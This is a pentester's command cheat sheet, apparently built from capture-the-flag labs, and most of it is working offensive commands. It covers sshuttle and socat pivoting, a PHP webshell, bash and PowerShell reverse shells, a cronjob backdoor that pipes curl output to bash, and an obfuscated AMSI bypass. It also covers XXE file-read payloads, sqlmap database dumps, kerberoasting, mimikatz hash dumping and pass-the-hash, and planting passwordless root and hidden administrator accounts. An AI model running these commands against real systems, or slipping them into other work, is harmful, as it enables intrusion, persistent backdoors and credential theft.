sudo apt install sshuttle

# The base command for connecting to a server with sshuttle is as follows:
sshuttle -r username@address subnet 

# For example, in our fictional 172.16.0.x network with a compromised server at 172.16.0.5, the command may look something like this:
sshuttle -r user@172.16.0.5 172.16.0.0/24

# We would then be asked for the user's password, and the proxy would be established. The tool will then just sit passively in the background and forward relevant traffic into the target network. Rather than specifying subnets, we could also use the -N option which attempts to determine them automatically based on the compromised server's own routing table:
sshuttle -r username@address -N

# Bear in mind that this may not always be successful though! As with the previous tools, these commands could also be backgrounded by appending the ampersand (&) symbol to the end. If this has worked, you should see the following line:
c : Connected to server.

# Well, that's great, but what happens if we don't have the user's password, or the server only accepts key-based authentication? Unfortunately, sshuttle doesn't currently seem to have a shorthand for specifying a private key to authenticate to the server with. That said, we can easily bypass this limitation using the switch
--ssh-cmd

# This switch allows us to specify what command gets executed by sshuttle when trying to authenticate with the compromised server. By default this is simply ssh with no arguments. With the --ssh-cmd switch, we can pick a different command to execute for authentication: say, ssh -i keyfile, for example! So, when using key-based authentication, the final command looks something like this:
sshuttle -r user@address --ssh-cmd "ssh -i KEYFILE" SUBNET

# To use our example from before, the command would be:
sshuttle -r user@172.16.0.5 --ssh-cmd "ssh -i private_key" 172.16.0.0/24

# Please Note: When using sshuttle, you may encounter an error that looks like this:
client: Connected.
client_loop: send disconnect: Broken pipe
client: fatal: server died with error code 255

# This can occur when the compromised machine you're connecting to is part of the subnet you're attempting to gain access to. For instance, if we were connecting to 172.16.0.5 and trying to forward 172.16.0.0/24, then we would be including the compromised server inside the newly forwarded subnet, thus disrupting the connection and causing the tool to die. To get around this, we tell sshuttle to exlude the compromised server from the subnet range using the -x switch. For example:
sshuttle -r user@172.16.0.5 172.16.0.0/24 -x 172.16.0.5  < -- This will allow sshuttle to create a connection without disrupting itself.


## socat relay and portforwarding

# Socat is not just great for fully stable Linux shells[1], it's also superb for port forwarding. The one big disadvantage of socat (aside from the frequent problems people have learning the syntax), is that it is very rarely installed by default on a target. That said, static binaries are easy to find for both Linux and Windows. Bear in mind that the Windows version is unlikely to bypass Antivirus software by default, so custom compilation may be required. Before we begin, it's worth noting that socat can be used to create encrypted connections. The techniques shown here could be combined with the encryption options detailed in the shells room to create encrypted port forwards and relays. To avoid overly complicating this section, this technique will not be taught here; however, it's well worth experimenting with this in your own time.

# Whilst the following techniques could not be used to set up a full proxy into a target network, it is quite possible to use them to successfully forward ports from both Linux and Windows compromised targets. In particular, socat makes a very good relay: for example, if you are attempting to get a shell on a target that does not have a direct connection back to your attacking computer, you could use socat to set up a relay on the currently compromised machine. This listens for the reverse shell from the target and then forwards it immediately back to the attacking box. 

## Reverse Shell Relay with socat - In this scenario we are using socat to create a relay for us to send a reverse shell back to our own attacking machine. First let's start a standard netcat listener on our attacking box 
sudo nc -lvnp 443

# Next, on the compromised server, use the following command to start the relay: Note: the order of the two addresses matters here. Make sure to open the listening port first, then connect back to the attacking machine.
./socat tcp-l:8000 tcp:ATTACKING_IP:443  &

# From here we can then create a reverse shell to the newly opened port 8000 on the compromised server. A brief explanation of the above command:

1. tcp-l:8000 is used to create the first half of the connection -- an IPv4 listener on tcp port 8000 of the target machine.
2. tcp:ATTACKING_IP:443 connects back to our local IP on port 443. The ATTACKING_IP obviously needs to be filled in correctly for this to work.
3. & backgrounds the listener, turning it into a job so that we can still use the shell to execute other commands.

# The relay connects back to a listener started using an alias to a standard netcat listener: sudo nc -lvnp 443. In this way we can set up a relay to send reverse shells through a compromised system, back to our own attacking machine. This technique can also be chained quite easily; however, in many cases it may be easier to just upload a static copy of netcat to receive your reverse shell directly on the compromised server.

## Port Forwarding with socat - The quick and easy way to set up a port forward with socat is quite simply to open up a listening port on the compromised server, and redirect whatever comes into it to the target server. For example, if the compromised server is 172.16.0.5 and the target is port 3306 of 172.16.0.10, we could use the following command (on the compromised server) to create a port forward:
./socat tcp-l:33060,fork,reuseaddr tcp:172.16.0.10:3306 &

# This opens up port 33060 on the compromised server and redirects the input from the attacking machine straight to the intended target server, essentially giving us access to the (presumably MySQL Database) running on our target of 172.16.0.10. The fork option is used to put every connection into a new process, and the reuseaddr option means that the port stays open after a connection is made to it. Combined, they allow us to use the same port forward for more than one connection. Once again we use & to background the shell, allowing us to keep using the same terminal session on the compromised server for other things. We can now connect to port 33060 on the relay (172.16.0.5) and have our connection directly relayed to our intended target of 172.16.0.10:3306.

## OTHER 

# switch to sudo user via higher privs (sudo -ll)
sudo -u toby bash -p

# cat the contents of a base64 ssh private key into a file and use file to ssh into the user with key 
cat key.b64 | base64 -d > key; chmod 600 key; ssh -i key root@localhost

# upload php webshell.php to run commands via upload form
<?php
    echo system($_GET["cmd"]);
?>

# run commands via url 
webshell.php?cmd=id;whoami;ls

# There are four easy ways to bypass your average client-side file upload filter:

1. Turn off Javascript in your browser -- this will work provided the site doesn't require Javascript in order to provide basic functionality. If turning off Javascript completely will prevent the site from working at all then one of the other methods would be more desirable; otherwise, this can be an effective way of completely bypassing the client-side filter.
  
2. Intercept and modify the incoming page. Using Burpsuite, we can intercept the incoming web page and strip out the Javascript filter before it has a chance to run. The process for this will be covered below.

3. Intercept and modify the file upload. Where the previous method works before the webpage is loaded, this method allows the web page to load as normal, but intercepts the file upload after it's already passed (and been accepted by the filter). Again, we will cover the process for using this method in the course of the task.
   
4. Send the file directly to the upload point. Why use the webpage with the filter, when you can send the file directly using a tool like curl? Posting the data directly to the page which contains the code for handling the file upload is another effective method for completely bypassing a client side filter. We will not be covering this method in any real depth in this tutorial, however, the syntax for such a command would look something like this: curl -X POST -F "submit:<value>" -F "<file-parameter>:@<path-to-file>" <site>. To use this method you would first aim to intercept a successful upload (using Burpsuite or the browser console) to see the parameters being used in the upload, which can then be slotted into the above command.


# smbmap enum with creds  
smbmap -H windcorp.thm -d windcopr.thm -u lilyle -p ChangeMe#1234


# login ssh without loading bashrc file  to bypass a loop or other error
ssh -t alex@10.10.150.157 /bin/bash --norc --noprofile


# transfer a binary via base64 
base64 binary 													(on target machine)
mkdir transfer_files; cd transfer_files; nano binary			(on attacker machine)
copy and paste base64 output to binary					(on attacker machine)
base64 -d binary > transfer_files/binary 					(on attacker machine)


# rev bash shell one liner
cat > /tmp/a.sh << "EOF"
#!/bin/bash
bash -i >& /dev/tcp/10.13.1.99/1337 0>&1
EOF

# cronjob backdoor with curl (maintaining persistence) - add line below to /etc/crontab must have root access.

* *     * * *   root    curl http://<yourip>/crontask.sh | bash

Notice that we put a "*" star symbol to everything. This means that our task will run every minute, every hour, every day , etc .
We first use "curl" to download a file , and then we pipe it to "bash"
The contents of the "shell" file that we are using are simply :
-------------------------------------------------
#!/bin/bash
bash -i >& /dev/tcp/ip/port 0>&1
--------------------------------------------------
We would have to run an HTTP server serving our shell.
You can achieve this by running : "python3 -m http.server 80"
Once our shell gets downloaded, it will be executed by "bash" and we would get a shell!
Don't forget to listen on your specified port with "nc -nvlp <port>"*


# cronjob escalate privs via bash SUID binary 
chmod +w file_scheduled_in_cron
echo 'chmod 4777 /bin/bash' >> file_scheduled_in_cron
/bin/bash -p

# multi reverse shells via php web form and a bash script(shells-multi.sh)
1. fire up python server (espanso :server) in dir -> /home/kali/Shared/Opt-Tools/shells 
2. launch a nc listener (espanso :listen) 
3. copy and paste code of following php script to the web form -> /home/kali/Shared/Opt-Tools/shells/execute-shells-multi.php 
4. navigate to the web form to trigger rev shell


# reverse powershells
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.13.1.99",1337);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.13.1.99',1337);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

# command to trigger rev powershell 
powershell "IEX(New-Object Net.WebClient).downloadString('http://10.13.1.99/revShell.ps1')"

# command injection payload via web form 
sudo tcpdump -i tun0 icmp  (on attacker machine)
admin | ping 10.13.1.99		(on target web app)

# using nc.exe binary on windows target for rev shell 
cd into dir with binary -> /home/kali/Shared/Opt-Tools/static-binaries/otherBinaries/windows/nc.exe
fire up python server on 80 (same terminal of attacker)
setup netcat listener on 1337 (on another terminal of attacker)
curl -H "Cookie: token=<REQUEST_COOKIE>"  -X POST http://10.10.147.72/profile -d 'username=testadmin | powershell curl 10.13.1.99/nc.exe -o nc.exe'(transfer nc binary to target via web form command injection)
nc.exe 10.13.1.99 1337 -e powershell (on target app)

# msfvenom 64 bit paylod via dll 
msfvenom -p windows/x64/meterpreter/reverse_tcp -ax64 -f dll LHOST=10.13.1.99 LPORT=1338 > rev_x64.dll

# dump kerb hashes via rubeasu
.\Rubeus.exe kerberoast /outfile:dump.txt

# find flags via windows 
dir flag.txt /s /p

# xxe injection test payload
#uncomment this <?xml version="1.0" encoding="utf-8"?>
  <!DOCTYPE replace [<!ENTITY xxe "VulnerableToXXE"> ]><root>
   <name>
     1
   </name>
   <search>
     &xxe;
   </search>
 </root>

# xxe payload to retrieve a file 
#uncomment this<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=FILE.php"> ]>
<root><name>1</name><search>&xxe;</search></root>

# sqlmap cheatsheet
https://abrictosecurity.com/blog/sqlmap-cheatsheet-and-examples/

# sqlmap to shell ( intercept sql vuln get request via burp and save to fisqlmaple named burp.txt)
sqlmap -r burp.txt --batch  --risk 3 --crawl=4  --forms  --os-shell --threads=10

# crawl for sqli with sqlmap and test for technique B (boolean based sqli) 
sqlmap -u URL  --batch  --risk 3 --forms  --dump --level=5 --crawl=4 --technique=B

# dump all mysql databases with sqlmap
sqlmap -u http://172.16.1.12/blog/category.php?id= --batch --level=5 --risk 3  --threads=10 --dump --dbs mysql

# blind based sqlmap attack to dump only password databases via cookie value
sqlmap -u URL --cookie='VALUE' --level=5 --risk=3 --batch --passwords --users --threads=10

# blind based sqlmap attack to dump all databases ofr specific type(oracle)
sqlmap -u URL --cookie='VALUE' --level=5 --risk=3 --batch --dump --dbms Oracle --threads=10

# memcached server vuln port 11211. command to dump the cached data
/usr/share/memcached/scripts/memcached-tool localhost:11211 dump

# connect to mysql 
mysql -u USER -p -h IP

# send a reuqest with curl
curl -X POST -F "password=123" -F "cmdtype=passwd" http://127.0.0.1:8080/passwd

# writeable shadow file priv esc (https://basicpentesting.blogspot.com/2020/07/linux-privesc-tryhackme.html)
1. first generate hash of password(pawnd) ->  mkpasswd -m sha-512 pawnd
2. replace hash of root via editor with new hash
3. now we can su into root user or ssh with new passwd


# send a post request via curl  with param id and value of 1 
curl -s IP:PORT/path.php -X POST -d "id=1"

# smb server file transfer from target (windows) to attacker(linux)
sudo impacket-smbserver -smb2support kali-share -username kali -password kali .			 			 (on attacker pc)
net view \\attacker-ip-addr																				(on target pc)
net use \\10.10.14.20\kali-share /u:kali kali   														(on target pc)
copy backup.zip \\10.10.14.20\kali\ 																(on target pc)


# smb server file transfer from attacker(linux) to target (windows) 
sudo impacket-smbserver -smb2support kali-share -username kali -password kali . 		  			(on attacker pc)
net view \\attacker-ip-addr																			(on target pc)
net use \\10.10.14.20\kali-share /u:kali kali   							 						(on target pc)
copy \\10.10.14.20\kali-share\file  C:\file-path\out-file											(on target pc)


# use powershell‘s Invoke-Command with credentials to get a reverse shell (setup nc -lvnp 1338 on attacker machine before launching last command)
C:\> powershell
PS C:\> $username = 'batman'
PS C:\> $password = 'Zx^#QZX+T!123'
PS C:\> $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
PS C:\> $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
PS C:\> Invoke-command -computername ARKHAM -credential $credential -scriptblock { cmd.exe /c "C:\windows\system32\spool\drivers\color\nc.exe" -e cmd.exe 10.10.14.20 1338 } 

# download a GreatSCT generated payload and execute via msbuild to bypass Constrained language mode in windows target
powershell wget 10.10.14.20/arkham.xml -O a.xml 
cmd /c C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe a.xml

# SSH Local Port Forwarding  (example below: using our local port 8888 to access port 52846 of target machine 10.129.135.151 using ssh creds for user jimmy. Now  we navigate to http://127.0.0.1:8888 to access machine )
ssh –L port:destination_host:destination_port username@IP
ssh -L 8888:127.0.0.1:52846 jimmy@10.129.135.151 -v

# add a dummy user to /etc/passwd with no creds
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy

# cronjob backdoor via wget (maintaining persistence) 
1. fire up python server on /home/kali/Shared/Opt-Tools/shells  dir as attacker
2. fire up nc -lvnp 9999 on separate terminal as attacker
3. from target machine run wget http://IP/cron-task.sh && chmod +x cron-task.sh && ./cron-task.sh  (or) curl http://IP/cron-task.sh -o cron-task.sh && chmod +x cron-task.sh && ./cron-task.sh 
4. every minute task will run and we will obtain a rev shell connection

## ssh key methods for persistence

# we can copy our generated key to targets authorized_keys file and use it to ssh into target
ssh-keygen -f TARGET_USER  																		 (on attacker machine)
echo 'copy and pasted .pub file generated from attacker to target' >> $HOME/.ssh/authorized_keys (on target machine)
chmod 600 TARGET_USER									  										  (on attacker machine)
sudo ssh -i TARGET_USER TARGET_USER@IP                         										   (on attacker machine)

# linux method to add sudo user with root privs, add ssh keys for access, with creds pawnd:pawnd for persistence
1. adduser pawnd; echo "pawnd  ALL=(ALL) NOPASSWD:ALL" | sudo tee /etc/sudoers.d/pawnd  	(on target machine)
2. cd /home/pawnd; mkdir .ssh; chmod 700 .ssh; cd .ssh;                                    (on target machine)
3. sudo ssh-keygen /home/pawnd/.ssh/id_rsa 													(on target machine)
4. copy and paste id_rsa > pawnd file on attacker machine                                   (as attacker machine)
5. sudo ssh -i pawnd pawnd@10.10.110.100                         	                  	  (as attacker machine)


# windows method to create a new user with RDP access for evilwinRM or rdp GUI access
net user pawnd pawnd /add
net localgroup Administrators pawnd /add
net localgroup "Remote Management Users" pawnd /add

# after creating a new user account run commands if needed to bypass firewall
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh advfirewall firewall set service type = remotedesktop mode = enable
netsh advfirewall firewall set rule group="remote desktop" new enable=yes
		
# launch an rdp GUI session via xfreerdp with a share option and clipboard access for file transfer ease/post exploitation (When creating a shared drive, this can be accessed either from the command line : cd \\tsclient\share )
xfreerdp /v:IP /u:pawnd /p:pawnd +clipboard /dynamic-resolution /drive:/usr/share/windows-resources/binaries,share


# now lets dump hashes with mimikatz  via method below using our xfreerdp session with share enabled and clipboard from above. Open command prompt as administrator and run command
\\tsclient\share\

# we next need to give ourselves the Debug privilege and elevate our integrity to SYSTEM level. This can be done with the following commands:
privilege::debug
token::elevate

# lets redirect mimikatz output to a log in \temp dir that is an a format for copy and paste 
log C:\Windows\Temp\mimikatz_dump.log

# We can now dump all of the SAM local password hashes using command below and then naviagate to \Temp dir to copy output
lsadump::sam

# passing the hash with mimikatz.exe
sekurlsa::pth /user:Administrator /domain:dollarcorp.moneycorp.local /ntlm:<ntlmhash> /run:powershell.exe

##!


# look for flags commands via linux
find / -type f -name flag.txt* 2>/dev/null;
find / -type f -name DANTE{* 2>/dev/null;

# look for flags commands via windows
cd C:\
dir flag.txt /s /p

Get-ChildItem -Path C:\Users\* -recurse |  Select-String -Pattern "DANTE{"
Get-ChildItem -Path C:\* -recurse |  Select-String -Pattern "DANTE{"


# spawn a evilWinRm session with a access to a directory for file transferring  (we then cd )
evil-winrm -u USERNAME  -p PASSWORD -i IP -s /usr/share/windows-resources/


# running python2 exploits fix (add shebang line below to top of code, then run program with python2 program.py) 
#!/usr/bin/env python


# python fix encoding issue ( add line below under shebang line)
# -*- coding: utf-8 -*-

# bypass a  limited shell via vim  
vim
:set shell=/bin/sh
:shell
python3 -c "import pty;pty.spawn('/bin/bash')"

# bypass AMSI 
sET-ItEM ( 'V'+'aR' +  'IA' + 'blE:1q2'  + 'uZx'  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    GeT-VariaBle  ( "1Q2U"  +"zX"  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System'  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f'amsi','d','InitFaile'  ),(  "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )


# sandbox pdf file with firejail this will  deny internet access and deny directory access of local machine
firejail --seccomp --nonewprivs --private --private-dev --private-tmp --net=none --x11 evince /media/kali/Extended-Storage/Courses/


# sandbox cherrytree doc with firejail this will  deny internet access and deny directory access of local machine
 firejail --seccomp --nonewprivs --private --private-dev --private-tmp --net=none --x11  --whitelist=/media/kali/Extended-Storage/Courses/ cherrytree  /media/kali/Extended-Storage/Courses/


# sandboxing libreoffice documents, this will open docs in a sandboxed environment and dispose of files saved in the temporary /home directories 
firejail --seccomp --nonewprivs --net=none --x11  --whitelist=/media/kali/Extended-Storage/Courses/ libreoffice /media/kali/Extended-Storage/Courses/

# sandboixng vlc player to play videos with no network access 
firejail --seccomp --nonewprivs --private --private-dev --private-tmp --net=none --x11  vlc /media/kali/Extended-Storage/Courses/

# sandboxing firefox web browser, this will open Firefox in a sandboxed environment and dispose of files saved in the temporary /home directories 
firejail --seccomp --nonewprivs --private --private-tmp firefox

# sandboxing images with firejail 
firejail --seccomp --nonewprivs --net=none --x11 shotwell /home/kali/

# how to enable rdp on a target machine 
https://www.interfacett.com/blogs/how-to-remotely-enable-and-disable-rdp-remote-desktop/

# methods of adding a target to burp scope via regex 
1. (^|^[^:]+:\/\/|[^\.]+\.)url.*
2. .*\.url\.com$
3. .*\.url\.*$

# restart espanso shortcut button keys
alt + alt

# wpscan enable all options 
wpscan --url HERE --enumerate ap,at,cb,dbe


